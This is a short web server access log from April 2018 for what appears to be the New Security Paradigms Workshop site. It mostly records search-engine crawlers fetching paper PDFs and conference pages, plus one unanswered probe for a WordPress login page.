157.55.39.113 - - [30/Apr/2018:15:45:45 -0400] "GET /papers/1993/nspw1993-lin.pdf HTTP/1.1" 200 1019039 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.15.142 - - [30/Apr/2018:15:46:45 -0400] "GET /2004/nspw2004program.pdf HTTP/1.1" 200 30919 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.91 - - [30/Apr/2018:15:46:58 -0400] "GET /papers/2012/docs/p77.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.163 - - [30/Apr/2018:15:47:45 -0400] "GET /2012/dates HTTP/1.1" 200 12747 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.27 - - [30/Apr/2018:15:48:45 -0400] "GET /2015 HTTP/1.1" 200 13329 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [30/Apr/2018:15:48:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.106.108.116 - - [30/Apr/2018:15:49:35 -0400] "HEAD /current/ HTTP/1.1" 200 3904 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
59.106.108.116 - - [30/Apr/2018:15:49:36 -0400] "GET /current/ HTTP/1.1" 200 8978 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
180.76.15.136 - - [30/Apr/2018:15:49:45 -0400] "GET /2012/submissions HTTP/1.1" 200 13535 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [30/Apr/2018:15:50:26 -0400] "GET /papers/2004/?C=M;O=D HTTP/1.1" 200 4367 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
93.158.161.90 - - [30/Apr/2018:15:50:30 -0400] "GET /papers/2004/?C=N;O=A HTTP/1.1" 200 4363 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
84.201.133.45 - - [30/Apr/2018:15:50:33 -0400] "GET /papers/2004/?C=D;O=D HTTP/1.1" 200 4365 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:15:50:37 -0400] "GET /papers/2004/?C=S;O=D HTTP/1.1" 200 4364 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.154 - - [30/Apr/2018:15:50:45 -0400] "GET /2004/past.shtml HTTP/1.1" 200 8897 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
105.4.7.30 - - [30/Apr/2018:15:51:12 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.4.7.30 - - [30/Apr/2018:15:51:13 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [30/Apr/2018:15:51:31 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
115.239.212.67 - - [30/Apr/2018:15:52:56 -0400] "GET / HTTP/1.1" 200 7085 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
